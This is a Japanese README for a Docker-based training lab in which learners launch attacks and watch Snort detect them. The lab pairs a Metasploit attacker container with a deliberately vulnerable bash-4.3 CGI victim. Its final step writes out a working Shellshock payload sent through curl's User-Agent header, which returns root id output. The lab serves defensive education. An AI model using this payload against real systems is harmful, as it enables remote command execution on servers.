# IDS-Education

## 概要
初学者に向けた簡易的かつ安全なIDS教育環境の構築を可能とする
### 特徴
- WSLを用いており、軽量なsnortによるIDS実験環境である
- 攻撃/被攻撃環境は互い以外の通信を完全に遮断されており、外部への攻撃危険性, 外部からの攻撃危険性が低い
- metasploitを用いた実践的な攻撃の演習、検知実験も可能
- Doclerfileの追記および変更やルールファイルの変更による自由度も高い

## ファイル
### docker-snort.tar.gz
#### 構成
```
snort-docker
├── Dockerfile
├── local.rules
└── snort.conf 
```
#### 内容
- Dockerfile: Dockerを起動するためのファイル。起動時にsnortをインストールする
- local.rules: あらかじめTCP通信,およびshellshockをそれぞれ検知するよう設定されたルールファイル。起動時にsnortのrulesフォルダにコピーされる
- snort.conf: 簡易的なsnortの設定が記述されている

### shellshock.tat.gz
#### 構成
```
shellshock
├── attacker
│   └── Dockerfile
├── victim
│   ├── Dockerfile
│   └── cgi-bin
│       └── vulnerable.sh
└── docker-compose.yml
```
#### 内容
- attacker: attacker-msfを起動するDockerfileを格納
    - Dockerfile: 起動時にmetasploitやcurlをインストールする
- victim: victim-shellshockを起動するDockerfile等を格納
    - Dockerfile: 起動時にpython3, bash-4.3をインストールする
    - cgi-bin: cgiスクリプトを格納
        - vulnerable.sh: 脆弱なbashを用いてコマンドを実行
- docker-compose.yml: attacker, victimの二つのコンテナのビルド、連携を定義

## 構築手法
1. WindowsにWSLをインストール
2. Githubからdocker-snort.tar.gz, shellshock.tar.gzをダウンロード(Downloadsフォルダにダウンロードしたと仮定)
3. WSLにDockerをインストール
4. 二つのtarファイルを解凍 \
    例(WSL内のbash)
    - cd ~/
    - tar -xzvf /mnt/c/Users/[ユーザー名]/Downloads/docker-snort.tar.gz
    - tar -xzvf /mnt/c/Users/[ユーザー名]/Downloads/shellshock.tar.gz
5. snort-monitorのDockerfile内、監視するブリッジ名を自分の環境に合わせて変更\
    例(WSL内のbash)
    - cd ~/
    - ip a (br-...という名前のインターフェース名をコピー)
    - nano snort-docker/Dockerfile
        - 最終行、CMD内の"br-..."をコピーしたものに変更
6. attack/victim, snortをそれぞれ起動 \
    例(WSL内のbash)
    - cd ~/snort-docker
    - docker build -t snort-monitor .
    - docker run -it --rm --network=host --cap-add=NET_ADMIN --cap-add=NET_RAW snort-monitor
    - (新しいWSLウィンドウを開く)
    - cd ~/shellshock
    - docker-compose build
    - docker-compose up -d
7. 攻撃コンテナの中に入る、攻撃を行う \
    例(WSL内のbash)
    - docker exec -it attacker-msf /bin/bash
    - (攻撃コンテナの中に入り、bashが起動)
    - curl -A "() { :;}; /usr/bin/id" http://victim:8000/cgi-bin/vulnerable.sh
    - (攻撃コンテナの中では uid=0(root) gid=0(root) groups=0(root) のような表示がされ、snortを起動したウィンドウにはTCP packet detected, shellshock deteted のアラートがそれぞれ表示される)